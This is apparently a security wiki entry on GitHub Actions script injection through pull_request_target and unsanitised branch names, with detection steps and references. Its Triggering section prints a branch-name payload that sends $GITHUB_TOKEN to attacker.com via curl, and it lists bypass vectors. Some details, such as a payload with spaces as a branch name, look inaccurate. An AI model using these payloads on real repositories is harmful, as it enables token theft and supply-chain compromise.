---
title: GitHub Actions — GITHUB_TOKEN Theft via Unsafe PR Base Ref
slug: github-actions-pr-token-theft
created_utc: 2026-05-21T00:00:00Z
updated_utc: 2026-05-21T00:00:00Z
tags: [technique/supply-chain, technique/ci-cd, technique/secrets-leak, technique/github]
inbound: []
---

# GitHub Actions — GITHUB_TOKEN Theft via Unsafe PR Base Ref

## Pattern

GitHub Actions workflows triggered by `pull_request_target` run in the context
of the base branch (not the PR branch) and have access to repository secrets
and `GITHUB_TOKEN`. If the workflow checks out the PR's head ref code and
executes it — or if the workflow uses `${{ github.event.pull_request.head.ref }}`
in a shell command without quoting — a malicious PR can inject code that reads
`SECRETS.*` environment variables or the `GITHUB_TOKEN`.

A more subtle variant: the workflow uses `actions/checkout` with `ref:
${{ github.event.pull_request.head.ref }}`, checking out attacker-controlled
code, then runs `npm install` or similar, executing the attacker's `package.json`
scripts with secret access.

The specific BBRE episode focused on workflows that used `github.head_ref`
(the branch name, controllable by the PR author) in a shell `run:` step
without sanitization, allowing branch names like `x'; curl attacker.com
-d $GITHUB_TOKEN; echo '` to exfiltrate the token.

## Preconditions

- Workflow uses `pull_request_target` event (runs with privileged context even
  for forks) or `push` to a branch that forks can target.
- Workflow executes attacker-controlled input in a shell context (branch name,
  PR title, commit message) without sanitization.
- `GITHUB_TOKEN` has write access to the repository or other resources.

## Detection

- Audit all `.github/workflows/*.yml` for:
  - `pull_request_target` trigger
  - `${{ github.event.pull_request.head.ref }}` or `github.head_ref` in `run:` steps
  - `actions/checkout` with `ref: ${{ ... }}` from PR context followed by code execution
- Safe pattern: use `${{ github.sha }}` (the merge commit, server-controlled) instead.

## Triggering

Create a PR from a fork with branch name:
```
'; curl https://attacker.com -d "$GITHUB_TOKEN"; echo '
```

If the workflow runs:
```yaml
- run: git checkout ${{ github.head_ref }}
```

The shell command becomes:
```sh
git checkout '; curl https://attacker.com -d "$GITHUB_TOKEN"; echo '
```

## Bypasses

- Expression injection via PR title if workflow uses `${{ github.event.pull_request.title }}`
- Via commit message if the workflow runs on push after PR merge
- `toJSON()` filter bypass: `${{ toJson(github.event.issue.body) }}` still expands

## Seen in the wild

- 2022 — GitHub Actions supply chain, various programs. The pattern was broadly
  exploited in open-source maintainer workflows. Specific BBRE episode covered a
  case with a significant bounty for identifying this class of issue.
  [BBRE](https://www.youtube.com/watch?v=GLXMGinQyFk)

## References

- GitHub Security Lab: "Keeping your GitHub Actions and workflows secure"
- GHSA-mfwh-5m23-j46w (rhysd/actionlint detects these patterns)
- See also: [dependency-confusion](../supply-chain/dependency-confusion.md)
